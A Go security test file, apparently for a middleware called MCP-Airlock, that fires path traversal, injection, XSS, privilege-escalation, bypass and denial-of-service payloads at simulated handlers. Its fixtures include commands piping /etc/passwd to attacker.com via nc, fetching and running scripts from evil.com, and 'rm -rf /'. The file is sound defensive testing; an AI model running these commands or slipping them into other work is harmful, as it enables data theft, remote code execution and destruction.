package security

import (
	"bytes"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"go.uber.org/zap/zaptest"
)

// TestPathTraversalAttacks tests various path traversal attack vectors
func TestPathTraversalAttacks(t *testing.T) {
	logger := zaptest.NewLogger(t)
	hardener, err := NewSecurityHardener(nil, logger)
	if err != nil {
		t.Fatalf("Failed to create security hardener: %v", err)
	}

	// Simulate a file serving handler that should be protected
	fileHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		path := r.URL.Query().Get("path")

		// This would be the vulnerable code we're testing protection against
		if strings.Contains(path, "..") {
			http.Error(w, "Path traversal detected", http.StatusBadRequest)
			return
		}

		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, "File: %s", path)
	})

	secureHandler := hardener.SecurityMiddleware()(fileHandler)

	pathTraversalPayloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"....//....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
		"..//..//..//etc//passwd",
		"..\\..\\..\\etc\\passwd",
		"....\\....\\....\\etc\\passwd",
		".%2e/.%2e/.%2e/etc/passwd",
	}

	for _, payload := range pathTraversalPayloads {
		t.Run(fmt.Sprintf("PathTraversal_%s", payload), func(t *testing.T) {
			req := httptest.NewRequest("GET", fmt.Sprintf("/file?path=%s", payload), nil)
			w := httptest.NewRecorder()

			secureHandler.ServeHTTP(w, req)

			// The security middleware should add protective headers
			// The application logic should detect and block path traversal
			if w.Code == http.StatusOK && strings.Contains(w.Body.String(), "etc/passwd") {
				t.Errorf("Path traversal attack succeeded with payload: %s", payload)
			}

			// Verify security headers are present
			if w.Header().Get("X-Content-Type-Options") != "nosniff" {
				t.Error("Missing X-Content-Type-Options header")
			}
		})
	}
}

// TestInjectionAttacks tests various injection attack vectors
func TestInjectionAttacks(t *testing.T) {
	logger := zaptest.NewLogger(t)
	hardener, err := NewSecurityHardener(nil, logger)
	if err != nil {
		t.Fatalf("Failed to create security hardener: %v", err)
	}

	// Simulate an API handler that processes JSON input
	apiHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var input map[string]interface{}
		if err := json.NewDecoder(r.Body).Decode(&input); err != nil {
			http.Error(w, "Invalid JSON", http.StatusBadRequest)
			return
		}

		// Simulate processing that could be vulnerable to injection
		if cmd, ok := input["command"].(string); ok {
			if strings.Contains(cmd, ";") || strings.Contains(cmd, "|") || strings.Contains(cmd, "&") {
				http.Error(w, "Command injection detected", http.StatusBadRequest)
				return
			}
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"status": "processed"})
	})

	secureHandler := hardener.SecurityMiddleware()(apiHandler)

	injectionPayloads := []map[string]interface{}{
		{"command": "ls; rm -rf /"},
		{"command": "cat /etc/passwd | nc attacker.com 4444"},
		{"command": "$(curl http://evil.com/malware.sh | sh)"},
		{"command": "`wget http://evil.com/backdoor`"},
		{"command": "ls && curl http://evil.com"},
		{"sql": "'; DROP TABLE users; --"},
		{"sql": "1' OR '1'='1"},
		{"sql": "admin'/**/OR/**/1=1#"},
		{"ldap": "*)(&(objectClass=user)(cn=*))"},
		{"xpath": "' or 1=1 or ''='"},
		{"script": "<script>alert('xss')</script>"},
		{"script": "javascript:alert('xss')"},
		{"script": "onload=alert('xss')"},
	}

	for i, payload := range injectionPayloads {
		t.Run(fmt.Sprintf("Injection_%d", i), func(t *testing.T) {
			jsonPayload, _ := json.Marshal(payload)
			req := httptest.NewRequest("POST", "/api", bytes.NewReader(jsonPayload))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			secureHandler.ServeHTTP(w, req)

			// Verify security headers are present
			if w.Header().Get("X-XSS-Protection") != "1; mode=block" {
				t.Error("Missing X-XSS-Protection header")
			}

			if w.Header().Get("Content-Security-Policy") == "" {
				t.Error("Missing Content-Security-Policy header")
			}

			// The application should detect and block injection attempts
			if w.Code == http.StatusOK {
				var response map[string]string
				json.NewDecoder(w.Body).Decode(&response)
				if response["status"] == "processed" {
					// Check if this was actually blocked by application logic
					for key, value := range payload {
						if key == "command" && strings.ContainsAny(value.(string), ";|&") {
							continue // This should have been blocked
						}
					}
				}
			}
		})
	}
}

// TestPrivilegeEscalationAttempts tests attempts to escalate privileges
func TestPrivilegeEscalationAttempts(t *testing.T) {
	logger := zaptest.NewLogger(t)
	hardener, err := NewSecurityHardener(nil, logger)
	if err != nil {
		t.Fatalf("Failed to create security hardener: %v", err)
	}

	// Simulate an admin endpoint that should require proper authorization
	adminHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Check for admin privileges (simplified)
		auth := r.Header.Get("Authorization")
		if !strings.HasPrefix(auth, "Bearer admin-") {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, "Admin access granted")
	})

	secureHandler := hardener.SecurityMiddleware()(adminHandler)

	privilegeEscalationAttempts := []struct {
		name   string
		header string
		value  string
	}{
		{"NoAuth", "Authorization", ""},
		{"FakeAdmin", "Authorization", "Bearer fake-admin-token"},
		{"SQLInjection", "Authorization", "Bearer admin'; DROP TABLE users; --"},
		{"HeaderInjection", "Authorization", "Bearer admin\r\nX-Admin: true"},
		{"UserToAdmin", "Authorization", "Bearer user-token-admin"},
		{"TokenManipulation", "Authorization", "Bearer admin-"},
		{"EncodedPayload", "Authorization", "Bearer YWRtaW4tZmFrZQ=="}, // base64 "admin-fake"
		{"DoubleEncoding", "Authorization", "Bearer %2561%2564%256d%2569%256e"},
		{"CaseManipulation", "Authorization", "Bearer ADMIN-token"},
		{"NullByte", "Authorization", "Bearer admin-\x00token"},
	}

	for _, attempt := range privilegeEscalationAttempts {
		t.Run(fmt.Sprintf("PrivEsc_%s", attempt.name), func(t *testing.T) {
			req := httptest.NewRequest("GET", "/admin", nil)
			if attempt.value != "" {
				req.Header.Set(attempt.header, attempt.value)
			}
			w := httptest.NewRecorder()

			secureHandler.ServeHTTP(w, req)

			// Most attempts should be unauthorized
			if attempt.name != "ValidAdmin" && w.Code == http.StatusOK {
				t.Errorf("Privilege escalation attempt succeeded: %s", attempt.name)
			}

			// Verify security headers are present
			if w.Header().Get("X-Frame-Options") != "DENY" {
				t.Error("Missing X-Frame-Options header")
			}
		})
	}
}

// TestDenialOfServiceAttacks tests DoS attack resistance
func TestDenialOfServiceAttacks(t *testing.T) {
	logger := zaptest.NewLogger(t)
	hardener, err := NewSecurityHardener(nil, logger)
	if err != nil {
		t.Fatalf("Failed to create security hardener: %v", err)
	}

	// Simulate a handler that processes requests
	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Simulate some processing time
		time.Sleep(10 * time.Millisecond)
		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, "Processed")
	})

	secureHandler := hardener.SecurityMiddleware()(handler)

	t.Run("LargePayload", func(t *testing.T) {
		// Create a large payload (1MB)
		largePayload := make([]byte, 1024*1024)
		rand.Read(largePayload)

		req := httptest.NewRequest("POST", "/api", bytes.NewReader(largePayload))
		req.Header.Set("Content-Type", "application/octet-stream")
		w := httptest.NewRecorder()

		start := time.Now()
		secureHandler.ServeHTTP(w, req)
		duration := time.Since(start)

		// Should not take too long to reject large payloads
		if duration > 5*time.Second {
			t.Errorf("Large payload processing took too long: %v", duration)
		}
	})

	t.Run("ManyHeaders", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/api", nil)

		// Add many headers to test header bomb attack
		for i := 0; i < 1000; i++ {
			req.Header.Add(fmt.Sprintf("X-Header-%d", i), fmt.Sprintf("value-%d", i))
		}

		w := httptest.NewRecorder()
		secureHandler.ServeHTTP(w, req)

		// Should handle many headers gracefully
		if w.Code >= 500 {
			t.Errorf("Server error with many headers: %d", w.Code)
		}
	})

	t.Run("SlowLoris", func(t *testing.T) {
		// Simulate slow request (this is limited in httptest)
		req := httptest.NewRequest("POST", "/api", strings.NewReader("slow"))
		w := httptest.NewRecorder()

		start := time.Now()
		secureHandler.ServeHTTP(w, req)
		duration := time.Since(start)

		// Should not hang indefinitely
		if duration > 30*time.Second {
			t.Errorf("Request took too long: %v", duration)
		}
	})
}

// TestInformationDisclosure tests for information leakage
func TestInformationDisclosure(t *testing.T) {
	logger := zaptest.NewLogger(t)
	hardener, err := NewSecurityHardener(nil, logger)
	if err != nil {
		t.Fatalf("Failed to create security hardener: %v", err)
	}

	// Simulate handlers that might leak information
	errorHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Simulate an error that might leak stack trace
		panic("internal error with sensitive info: /home/user/.secrets")
	})

	// Add panic recovery
	recoveryHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		defer func() {
			if r := recover(); r != nil {
				http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			}
		}()
		errorHandler.ServeHTTP(w, r)
	})

	secureHandler := hardener.SecurityMiddleware()(recoveryHandler)

	t.Run("ErrorInformationLeakage", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/error", nil)
		w := httptest.NewRecorder()

		secureHandler.ServeHTTP(w, req)

		// Should not leak sensitive information in error responses
		body := w.Body.String()
		sensitivePatterns := []string{
			"/home/user",
			".secrets",
			"panic:",
			"goroutine",
			"runtime.",
		}

		for _, pattern := range sensitivePatterns {
			if strings.Contains(body, pattern) {
				t.Errorf("Error response contains sensitive information: %s", pattern)
			}
		}

		// Should have generic error message
		if !strings.Contains(body, "Internal Server Error") {
			t.Error("Should return generic error message")
		}
	})

	t.Run("ServerHeaderInformation", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/", nil)
		w := httptest.NewRecorder()

		secureHandler.ServeHTTP(w, req)

		// Should not reveal detailed server information
		server := w.Header().Get("Server")
		if server != "MCP-Airlock" {
			t.Errorf("Server header should be generic, got: %s", server)
		}

		// Should not have default Go server headers
		if strings.Contains(server, "Go") || strings.Contains(server, "go") {
			t.Error("Server header should not reveal Go runtime")
		}
	})

	t.Run("MethodNotAllowed", func(t *testing.T) {
		// Test that unsupported methods don't reveal information
		methods := []string{"TRACE", "OPTIONS", "CONNECT", "PATCH"}

		for _, method := range methods {
			req := httptest.NewRequest(method, "/", nil)
			w := httptest.NewRecorder()

			secureHandler.ServeHTTP(w, req)

			// Should not reveal supported methods or internal details
			body := w.Body.String()
			if strings.Contains(strings.ToLower(body), "method") &&
				strings.Contains(strings.ToLower(body), "allowed") {
				// This is acceptable
				continue
			}

			// Check that it doesn't reveal internal structure
			internalPatterns := []string{
				"handler",
				"router",
				"middleware",
				"internal",
			}

			for _, pattern := range internalPatterns {
				if strings.Contains(strings.ToLower(body), pattern) {
					t.Errorf("Method %s response reveals internal information: %s", method, pattern)
				}
			}
		}
	})
}

// TestSecurityBypass tests attempts to bypass security controls
func TestSecurityBypass(t *testing.T) {
	logger := zaptest.NewLogger(t)
	hardener, err := NewSecurityHardener(nil, logger)
	if err != nil {
		t.Fatalf("Failed to create security hardener: %v", err)
	}

	// Simulate a protected handler
	protectedHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, "Protected content")
	})

	secureHandler := hardener.SecurityMiddleware()(protectedHandler)

	bypassAttempts := []struct {
		name   string
		modify func(*http.Request)
	}{
		{
			"DoubleSlash",
			func(req *http.Request) {
				req.URL.Path = "//protected"
			},
		},
		{
			"TrailingSlash",
			func(req *http.Request) {
				req.URL.Path = "/protected/"
			},
		},
		{
			"CaseManipulation",
			func(req *http.Request) {
				req.URL.Path = "/PROTECTED"
			},
		},
		{
			"URLEncoding",
			func(req *http.Request) {
				req.URL.Path = "/%70%72%6f%74%65%63%74%65%64" // "protected"
			},
		},
		{
			"UnicodeNormalization",
			func(req *http.Request) {
				req.URL.Path = "/protecte\u0064" // Unicode 'd'
			},
		},
		{
			"HTTPMethodOverride",
			func(req *http.Request) {
				req.Header.Set("X-HTTP-Method-Override", "GET")
				req.Method = "POST"
			},
		},
		{
			"HostHeaderInjection",
			func(req *http.Request) {
				req.Header.Set("Host", "evil.com")
			},
		},
		{
			"XForwardedFor",
			func(req *http.Request) {
				req.Header.Set("X-Forwarded-For", "127.0.0.1")
				req.Header.Set("X-Real-IP", "127.0.0.1")
			},
		},
	}

	for _, attempt := range bypassAttempts {
		t.Run(fmt.Sprintf("Bypass_%s", attempt.name), func(t *testing.T) {
			req := httptest.NewRequest("GET", "/protected", nil)
			attempt.modify(req)
			w := httptest.NewRecorder()

			secureHandler.ServeHTTP(w, req)

			// Verify security headers are still present
			securityHeaders := []string{
				"X-Content-Type-Options",
				"X-Frame-Options",
				"X-XSS-Protection",
				"Content-Security-Policy",
			}

			for _, header := range securityHeaders {
				if w.Header().Get(header) == "" {
					t.Errorf("Security header %s missing in bypass attempt %s", header, attempt.name)
				}
			}

			// Verify server header is still controlled
			if server := w.Header().Get("Server"); server != "MCP-Airlock" {
				t.Errorf("Server header compromised in bypass attempt %s: %s", attempt.name, server)
			}
		})
	}
}

// BenchmarkSecurityOverhead measures the performance impact of security measures
func BenchmarkSecurityOverhead(b *testing.B) {
	logger := zaptest.NewLogger(b)
	hardener, err := NewSecurityHardener(nil, logger)
	if err != nil {
		b.Fatalf("Failed to create security hardener: %v", err)
	}

	// Simple handler
	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("OK"))
	})

	secureHandler := hardener.SecurityMiddleware()(handler)
	req := httptest.NewRequest("GET", "/", nil)

	b.Run("WithoutSecurity", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			w := httptest.NewRecorder()
			handler.ServeHTTP(w, req)
		}
	})

	b.Run("WithSecurity", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			w := httptest.NewRecorder()
			secureHandler.ServeHTTP(w, req)
		}
	})
}

// TestConcurrentSecurityAttacks tests security under concurrent load
func TestConcurrentSecurityAttacks(t *testing.T) {
	logger := zaptest.NewLogger(t)
	hardener, err := NewSecurityHardener(nil, logger)
	if err != nil {
		t.Fatalf("Failed to create security hardener: %v", err)
	}

	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(1 * time.Millisecond) // Simulate processing
		w.WriteHeader(http.StatusOK)
	})

	secureHandler := hardener.SecurityMiddleware()(handler)

	// Run concurrent requests with various attack payloads
	const numGoroutines = 50
	const requestsPerGoroutine = 10

	done := make(chan bool, numGoroutines)
	errors := make(chan error, numGoroutines*requestsPerGoroutine)

	for i := 0; i < numGoroutines; i++ {
		go func(goroutineID int) {
			defer func() { done <- true }()

			for j := 0; j < requestsPerGoroutine; j++ {
				req := httptest.NewRequest("GET", fmt.Sprintf("/test?id=%d-%d", goroutineID, j), nil)

				// Add some attack payloads
				if j%3 == 0 {
					req.Header.Set("X-Attack", "<script>alert('xss')</script>")
				}
				if j%3 == 1 {
					req.URL.RawQuery = "path=../../../etc/passwd"
				}

				w := httptest.NewRecorder()
				secureHandler.ServeHTTP(w, req)

				// Verify security headers are present
				if w.Header().Get("X-Content-Type-Options") != "nosniff" {
					errors <- fmt.Errorf("missing security header in concurrent request %d-%d", goroutineID, j)
				}
			}
		}(i)
	}

	// Wait for all goroutines to complete
	for i := 0; i < numGoroutines; i++ {
		<-done
	}

	close(errors)

	// Check for any errors
	var errorCount int
	for err := range errors {
		t.Error(err)
		errorCount++
	}

	if errorCount > 0 {
		t.Errorf("Security failures under concurrent load: %d errors", errorCount)
	}
}
